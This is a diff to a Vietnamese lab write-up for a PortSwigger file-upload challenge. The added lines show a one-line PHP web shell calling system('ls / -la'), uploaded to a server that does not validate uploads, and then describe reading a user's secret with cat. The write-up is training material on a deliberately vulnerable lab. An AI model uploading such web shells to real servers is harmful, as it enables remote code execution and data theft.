@@ -21,4 +21,13 @@
 ### Demo
 - Ở [đây](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload) mình có 1 challenge demo.
 - Theo chall thì ta cần tìm được secret của carlos. Chall cung cấp cho ta biết rằng web không xác thực bất kỳ điều gì với tệp được tải lên.
-- Ta tạo một file php và upload thử
+- Ta tạo một file php và upload thử.
+```php
+<?php system('ls / -la'); ?>
+```
+- Sau khi upload ta thấy web đã thực thi code. Ta tiến hành tìm thông tin bị ẩn giấu.
+
+![image](https://github.com/user-attachments/assets/0aa164c4-3f86-43cf-9f9b-1a87a276ceb8)
+- Do biết được đường dẫn nên ta cat ra thôi:)))
+
+![image](https://github.com/user-attachments/assets/48398b45-dec5-4bab-afaa-bc0fff0ef635)
